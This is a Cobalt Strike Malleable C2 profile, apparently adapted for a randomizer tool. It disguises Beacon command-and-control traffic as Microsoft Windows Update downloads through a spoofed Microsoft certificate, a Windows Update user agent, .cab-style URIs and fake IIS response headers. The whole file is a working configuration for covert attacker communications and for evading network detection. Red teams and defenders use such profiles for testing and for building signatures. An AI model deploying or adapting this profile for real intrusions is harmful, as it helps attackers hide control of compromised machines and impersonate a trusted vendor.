# This profile has been modified to use with the Malleable C2 Profile Randomizer

#
# Microsoft Update
# 
# Author: @bluscreenofjeff
#

#set https cert info
#information assumed based on other Microsoft certs
https-certificate {
    set CN       "www.windowsupdate.com"; #Common Name
    set O        "Microsoft Corporation"; #Organization Name
    set C        "US"; #Country
    set L        "Redmond"; #Locality
    set OU       "Microsoft IT"; #Organizational Unit Name
    set ST       "WA"; #State or Province
    set validity "365"; #Number of days the cert is valid for
}

#default Beacon sleep duration and jitter
set sleeptime "%%number:2%%00";
set jitter    "1%%number%%";

#default useragent for HTTP comms
set useragent "Windows-Update-Agent/10.0.%%number:5%%.%%number:5%% Client-Protocol/1.40";

#IP address used to indicate no tasks are available to DNS Beacon
set dns_idle "8.8.4.4";

#Force a sleep prior to each individual DNS request. (in milliseconds)
set dns_sleep "0";

#Maximum length of hostname when uploading data over DNS (0-255)
set maxdns    "24%%number%%";

http-get {

    set uri "/c/msdownload/update/others/2016/12/%%number:8%%_";

    client {

        header "Accept" "*/*";
        header "Host" "download.windowsupdate.com";
        
        #session metadata
        metadata {
            base64url;
            append ".cab";
            uri-append;
        }
    }


    server {
        header "Content-Type" "application/vnd.ms-cab-compressed";
        header "Server" "Microsoft-IIS/8.5";
        header "MSRegion" "N. America";
        header "Connection" "keep-alive";
        header "X-Powered-By" "ASP.NET";

        #Beacon's tasks
        output {

            print;
        }
    }
}

http-post {
    
    set uri "/c/msdownload/update/others/2016/12/%%number:7%%_";
    set verb "GET";

    client {

        header "Accept" "*/*";

        #session ID
        id {
            prepend "download.windowsupdate.com/c/";
            header "Host";
        }


        #Beacon's responses
        output {
            base64url;
            append ".cab";
            uri-append;
        }
    }

    server {
        header "Content-Type" "application/vnd.ms-cab-compressed";
        header "Server" "Microsoft-IIS/8.5";
        header "MSRegion" "N. America";
        header "Connection" "keep-alive";
        header "X-Powered-By" "ASP.NET";

        #empty
        output {
            print;
        }
    }
}

#change the stager server
http-stager {
    server {
        header "Content-Type" "application/vnd.ms-cab-compressed";
    }
}
